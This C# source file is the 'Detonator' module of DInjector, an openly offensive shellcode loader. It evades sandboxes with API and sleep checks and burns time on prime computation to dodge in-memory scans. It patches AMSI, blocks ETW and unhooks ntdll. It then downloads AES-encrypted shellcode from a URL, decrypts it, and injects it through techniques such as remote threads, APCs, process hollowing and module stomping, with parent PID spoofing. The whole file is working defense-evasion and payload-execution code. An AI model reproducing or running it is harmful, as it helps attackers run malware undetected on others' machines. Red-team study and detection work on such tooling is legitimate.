﻿using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Diagnostics;
using System.Globalization;
using System.Collections.Generic;

using DI = DInvoke;

namespace DInjector
{
    public class Detonator
    {
        /// <summary>
        /// Check if we're in a sandbox by calling a rare-emulated API.
        /// </summary>
        static bool UncommonAPICheck()
        {
            if (Win32.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
                return false;

            return true;
        }

        /// <summary>
        /// Check if the emulator did not fast-forward through the sleep instruction.
        /// </summary>
        static bool SleepCheck()
        {
            var rand = new Random();
            uint dream = (uint)rand.Next(2000, 3000);
            double delta = dream / 1000 - 0.5;

            DateTime before = DateTime.Now;
            Win32.Sleep(dream);

            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
                return false;

            return true;
        }

        /// <summary>
        /// Calculate primes to sleep before execution.
        /// </summary>
        static bool IsPrime(int number)
        {
            bool CalcPrime(int value)
            {
                var possibleFactors = Math.Sqrt(number);

                for (var factor = 2; factor <= possibleFactors; factor++)
                    if (value % factor == 0)
                        return false;

                return true;
            }

            return number > 1 && CalcPrime(number);
        }

        static void BoomExecute(Dictionary<string, string> options)
        {
            // Sleep to evade potential in-memory scan
            try
            {
                int k = 0, sleep = int.Parse(options["/sleep"]);
                if (0 < sleep && sleep < 10)
                    k = 10;
                else if (10 <= sleep && sleep < 20)
                    k = 8;
                else if (20 <= sleep && sleep < 30)
                    k = 6;
                else if (30 <= sleep && sleep < 40)
                    k = 4;
                else if (40 <= sleep && sleep < 50)
                    k = 2;
                else if (50 <= sleep && sleep < 60 || 60 <= sleep)
                    k = 1;

                Console.WriteLine("(Detonator) [=] Sleeping a bit ...");

                int start = 1, end = sleep * k * 100000;
                _ = Enumerable.Range(start, end - start).Where(IsPrime).Select(number => number).ToList();
            }
            catch (Exception)
            { }

            // Bypass AMSI (current process)
            try
            {
                bool localAm51 = false, forceLocalAm51 = false;
                if (options["/am51"].ToUpper() == "FORCE")
                    localAm51 = forceLocalAm51 = true;
                else if (bool.Parse(options["/am51"]))
                    localAm51 = true;

                if (localAm51)
                    AM51.Patch(force: forceLocalAm51);
            }
            catch (Exception)
            { }

            // Block ETW
            try
            {
                if (bool.Parse(options["/etw"]))
                    ETW.Block();
            }
            catch (Exception)
            { }

            // Unhook ntdll.dll
            try
            {
                if (bool.Parse(options["/unhook"]))
                    Unhooker.Unhook();
            }
            catch (Exception)
            { }

            var commandName = string.Empty;
            foreach (KeyValuePair<string, string> item in options)
                if (item.Value == string.Empty)
                    commandName = item.Key;

            var shellcodePath = options["/sc"];
            var password = options["/p"];

            byte[] shellcodeEncrypted;
            if (shellcodePath.StartsWith("http", ignoreCase: true, culture: new CultureInfo("en-US")))
            {
                Console.WriteLine("(Detonator) [*] Loading sc from URL");
                WebClient wc = new WebClient();
                ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                BinaryReader br = new BinaryReader(ms);
                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
            }
            else
            {
                Console.WriteLine("(Detonator) [*] Loading sc from base64 input");
                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
            }

            AES ctx = new AES(password);
            var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);

            int flipSleep = 0;
            try
            {
                flipSleep = int.Parse(options["/flipSleep"]);
            }
            catch (Exception)
            { }

            bool remoteAm51 = false, forceRemoteAm51 = false;
            try
            {
                if (options["/remoteAm51"].ToUpper() == "FORCE")
                    remoteAm51 = forceRemoteAm51 = true;
                else if (bool.Parse(options["/remoteAm51"]))
                    remoteAm51 = true;
            }
            catch (Exception)
            { }

            var ppid = 0;
            try
            {
                ppid = int.Parse(options["/ppid"]);
            }
            catch (Exception)
            { }

            var blockDlls = false;
            try
            {
                if (bool.Parse(options["/blockDlls"]))
                    blockDlls = true;
            }
            catch (Exception)
            { }

            var debug = false;
            try
            {
                if (bool.Parse(options["/debug"]))
                    debug = true;
            }
            catch (Exception)
            { }

            try
            {
                switch (commandName.ToLower())
                {
                    case "functionpointer":
                        FunctionPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    /*case "functionpointerunsafe":
                        FunctionPointerUnsafe.Execute(
                            shellcodeBytes,
                            debug);
                        break;*/

                    case "clipboardpointer":
                        ClipboardPointer.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "timeformats":
                        TimeFormats.Execute(
                            shellcodeBytes,
                            debug);
                        break;

                    case "currentthread":
                        string strProtect = "RX";
                        try
                        {
                            strProtect = options["/protect"].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint protect = 0;
                        if (strProtect == "RWX")
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
                        else // if (strProtect == "RX")
                            protect = DI.Data.Win32.WinNT.PAGE_EXECUTE_READ;

                        uint timeout = 0;
                        try
                        {
                            timeout = uint.Parse(options["/timeout"]);
                        }
                        catch (Exception)
                        { }

                        string strFluctuate = "-1";
                        try
                        {
                            strFluctuate = options["/fluctuate"].ToUpper();
                        }
                        catch (Exception)
                        { }

                        uint fluctuate = 0;
                        if (strFluctuate == "RW")
                            fluctuate = DI.Data.Win32.WinNT.PAGE_READWRITE;
                        //else if (strFluctuate == "NA")
                        //fluctuate = DI.Data.Win32.WinNT.PAGE_NOACCESS;

                        var spoofStack = false;
                        try
                        {
                            if (bool.Parse(options["/spoofStack"]))
                                spoofStack = true;
                        }
                        catch (Exception)
                        { }

                        CurrentThread.Execute(
                            shellcodeBytes,
                            protect,
                            timeout,
                            flipSleep,
                            fluctuate,
                            spoofStack,
                            debug);
                        break;

                    case "currentthreaduuid":
                        string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
                        CurrentThreadUuid.Execute(shellcodeUuids);
                        break;

                    case "remotethread":
                        RemoteThread.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreaddll":
                        RemoteThreadDll.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            options["/dll"],
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadview":
                        RemoteThreadView.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadsuspended":
                        if (flipSleep == 0)
                        {
                            var rand = new Random();
                            flipSleep = rand.Next(10000, 12500);
                        }

                        RemoteThreadSuspended.Execute(
                            shellcodeBytes,
                            int.Parse(options["/pid"]),
                            flipSleep,
                            remoteAm51,
                            forceRemoteAm51,
                            debug);
                        break;

                    case "remotethreadkernelcb":
                        RemoteThreadKernelCB.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadapc":
                        RemoteThreadAPC.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "remotethreadcontext":
                        RemoteThreadContext.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "processhollowing":
                        ProcessHollowing.Execute(
                            shellcodeBytes,
                            options["/image"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;

                    case "modulestomping":
                        ModuleStomping.Execute(
                            shellcodeBytes,
                            options["/image"],
                            options["/stompDll"],
                            options["/stompExport"],
                            ppid,
                            blockDlls,
                            remoteAm51,
                            debug);
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine(e.InnerException);
            }
        }

        public static string BoomString(string command)
        {
            if (!UncommonAPICheck())
                return "(Detonator) [-] Failed uncommon API check\n";

            if (!SleepCheck())
                return "(Detonator) [-] Failed sleep check\n";

            var args = command.Split() ;
            var options = ArgumentParser.Parse(args);

            // Stolen from Rubeus: https://github.com/GhostPack/Rubeus/blob/493b8c72c32426db95ffcbd355442fdb2791ca25/Rubeus/Program.cs#L75-L93
            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            var stdOutWriter = new StringWriter();
            var stdErrWriter = new StringWriter();
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);

            BoomExecute(options);

            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);

            var output = "";
            output += stdOutWriter.ToString();
            output += stdErrWriter.ToString();

            return output;
        }

        public static void Boom(string command)
        {
            if (!UncommonAPICheck())
            {
                Console.WriteLine("(Detonator) [-] Failed uncommon API check");
                return;
            }

            if (!SleepCheck())
            {
                Console.WriteLine("(Detonator) [-] Failed sleep check");
                return;
            }

            var args = command.Split();
            var options = ArgumentParser.Parse(args);

            BoomExecute(options);
        }
    }
}
